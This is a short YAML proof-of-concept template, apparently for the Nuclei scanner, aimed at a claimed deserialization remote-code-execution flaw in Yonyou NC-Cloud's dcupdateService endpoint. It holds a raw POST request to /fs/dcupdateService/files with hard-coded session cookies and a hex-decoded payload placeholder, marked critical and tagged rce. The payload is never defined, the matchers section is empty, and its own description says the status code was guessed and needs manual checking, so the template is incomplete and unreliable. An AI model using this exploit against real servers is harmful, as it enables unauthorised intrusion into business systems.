id: poc-eaae74876774f063a823
info:
  name: 用友NC-ClouddcupdateService存在反序列化漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'POST /fs/dcupdateService/files HTTP/1.1

    Host: {{Hostname}}

    Cookie: JSESSIONID=976CCA93B65FC45D67236311CCF581AB; JSESSIONID=84A233F63DC3637A8958D22F7FD8B305

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Upgrade-Insecure-Requests: 1

    Sec-Fetch-Dest: document

    Sec-Fetch-Mode: navigate

    Sec-Fetch-Site: none

    Sec-Fetch-User: ?1

    Te: trailers

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 0


    {{hexd(payload)}}'
  redirects: false
  matchers:
